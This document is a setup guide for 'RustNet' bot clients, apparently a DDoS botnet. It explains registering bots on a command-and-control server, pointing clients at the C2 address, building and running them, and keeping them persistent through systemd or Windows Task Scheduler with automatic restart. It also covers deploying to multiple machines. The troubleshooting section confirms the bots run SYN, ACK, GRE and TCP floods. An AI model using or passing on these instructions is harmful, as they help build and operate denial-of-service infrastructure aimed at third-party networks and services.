# Bot Client Setup Guide

Quick guide for deploying RustNet bot clients.

## Prerequisites

- Rust 1.70+ installed
- Network access to C&C server (port 7002)
- Bot authentication token from server

## Step 1: Get Bot Token

On the **server**, login as Owner and run:

```bash
!regbot x86_64
```

Output:
```
[OK] Bot registered successfully!
  Bot ID: a1b2c3d4-e5f6-7890-abcd-ef1234567890
  Token: Xy9kLm4pQr8sT2uVwX5yZ1aB3cD6eF9gH0iJ2kL4mN7oP

[!] Save this token securely! It will be needed by the bot client.
  Update your bot client: const BOT_AUTH_TOKEN: &str = "Xy9k...";
```

⚠️ **IMPORTANT**: Copy the token immediately - it's only shown once!

## Step 2: Configure Bot Token

### Method A: Token File (Recommended)

```bash
cd client

# Create token file
echo "Xy9kLm4pQr8sT2uVwX5yZ1aB3cD6eF9gH0iJ2kL4mN7oP" > bot_token.txt

# Verify
cat bot_token.txt
```

### Method B: Environment Variable

```bash
# Linux/Mac
export BOT_AUTH_TOKEN="Xy9kLm4pQr8sT2uVwX5yZ1aB3cD6eF9gH0iJ2kL4mN7oP"

# Windows CMD
set BOT_AUTH_TOKEN=Xy9kLm4pQr8sT2uVwX5yZ1aB3cD6eF9gH0iJ2kL4mN7oP

# Windows PowerShell
$env:BOT_AUTH_TOKEN="Xy9kLm4pQr8sT2uVwX5yZ1aB3cD6eF9gH0iJ2kL4mN7oP"
```

## Step 3: Configure C2 Server Address

Edit `client/src/main.rs` line 13:

```rust
const C2_ADDRESS: &str = "YOUR_SERVER_IP:7002";
```

Example:
```rust
const C2_ADDRESS: &str = "192.168.1.100:7002";  // Local network
const C2_ADDRESS: &str = "203.0.113.50:7002";   // Public IP
```

## Step 4: Build Bot Client

```bash
cd client

# Development build (with debug info)
cargo build

# Production build (optimized, smaller size)
cargo build --release
```

Binary location:
- Debug: `target/debug/rustnet-client`
- Release: `target/release/rustnet-client`

## Step 5: Run Bot Client

```bash
# Run release build
./target/release/rustnet-client

# Or with logging
RUST_LOG=info ./target/release/rustnet-client
```

Expected output:
```
🤖 RustNet Bot v2.0 - Starting
CPU cores: 8
[OK] Connected to C2 server at 192.168.1.100:7002
[OK] Authenticated with C2 server
```

## Troubleshooting

### Error: "Bot authentication token not configured!"

**Cause**: Token file missing and environment variable not set.

**Fix**:
```bash
# Check token file exists
ls -la bot_token.txt

# Or check environment variable
echo $BOT_AUTH_TOKEN

# Create token file
echo "YOUR_TOKEN" > bot_token.txt
```

### Error: "Authentication failed: AUTH_FAILED"

**Cause**: Token is invalid or not registered on server.

**Fix**:
1. Verify token matches exactly (no extra spaces/newlines)
2. Register new bot on server with `!regbot`
3. Update token file with new token

### Error: "Connection refused"

**Cause**: Can't reach C2 server.

**Fix**:
1. Verify C2_ADDRESS is correct
2. Check server is running: `ps aux | grep rustnet-server`
3. Check firewall allows port 7002
4. Test with: `nc -zv SERVER_IP 7002`

### Bot connects but immediately disconnects

**Cause**: Heartbeat failure or network instability.

**Fix**:
- Check network stability
- Review server logs for errors
- Ensure no firewall is dropping packets

### Bot shows "WARNING: True SYN flooding requires raw socket access"

**Status**: This is expected behavior.

**Explanation**: SYN/ACK/GRE floods require raw socket privileges. The bot falls back to TCP flooding which works without elevated privileges.

## Advanced: Running as Service

### Linux (systemd)

Create `/etc/systemd/system/rustnet-bot.service`:

```ini
[Unit]
Description=RustNet Bot Client
After=network.target

[Service]
Type=simple
User=rustnet
WorkingDirectory=/opt/rustnet/client
Environment="BOT_AUTH_TOKEN=YOUR_TOKEN_HERE"
ExecStart=/opt/rustnet/client/target/release/rustnet-client
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
```

Enable and start:
```bash
sudo systemctl daemon-reload
sudo systemctl enable rustnet-bot
sudo systemctl start rustnet-bot
sudo systemctl status rustnet-bot
```

### Windows (Task Scheduler)

1. Open Task Scheduler
2. Create Basic Task → "RustNet Bot"
3. Trigger: "At startup"
4. Action: "Start a program"
   - Program: `C:\RustNet\client\target\release\rustnet-client.exe`
   - Start in: `C:\RustNet\client`
5. Properties → General → "Run whether user is logged on or not"
6. Properties → Settings → "If task fails, restart every: 1 minute"

## Security Best Practices

### Token Storage

✅ **DO**:
- Store token in file with restrictive permissions: `chmod 600 bot_token.txt`
- Use environment variables for ephemeral deployments
- Rotate tokens periodically

❌ **DON'T**:
- Commit token files to git (add to .gitignore)
- Share tokens in chat/email (use secure channels)
- Hardcode tokens in source code

### Network Security

✅ **DO**:
- Use VPN/private network when possible
- Monitor bot logs for suspicious activity
- Limit bot privileges (don't run as root)

❌ **DON'T**:
- Expose bots to public internet without firewall
- Run bots with admin/root privileges
- Use same token for all bots (use `!regbot` for each)

## Monitoring

View bot logs:
```bash
# Standard output
RUST_LOG=info ./rustnet-client

# To file
RUST_LOG=info ./rustnet-client 2>&1 | tee bot.log

# Systemd logs
sudo journalctl -u rustnet-bot -f
```

Check bot status on server:
```
listbots
```

Output:
```
=== Registered Bots ===
Total registered: 5 | Connected: 3

  [ONLINE] a1b2c3d4-... | x86_64 | Registered: 2025-11-17 | Last: 2025-11-17 14:30
  [OFFLINE] e5f6g7h8-... | arm64 | Registered: 2025-11-15 | Last: 2025-11-16 10:22
```

## Multi-Bot Deployment

For deploying to multiple machines:

1. Register each bot individually:
   ```
   !regbot x86_64_server1
   !regbot x86_64_server2
   !regbot arm64_rpi
   ```

2. Each bot gets unique token

3. Deploy with respective token:
   ```bash
   # Server 1
   scp bot_token_server1.txt user@server1:/opt/rustnet/bot_token.txt
   
   # Server 2
   scp bot_token_server2.txt user@server2:/opt/rustnet/bot_token.txt
   ```

4. Monitor all bots:
   ```
   listbots
   ```

---

## Quick Reference

| Command | Description |
|---------|-------------|
| `!regbot <arch>` | Register new bot on server |
| `listbots` | View all registered bots |
| `RUST_LOG=info` | Enable bot logging |
| `ctrl+c` | Stop bot gracefully |

For more details, see main [README.md](../docs/README.md)
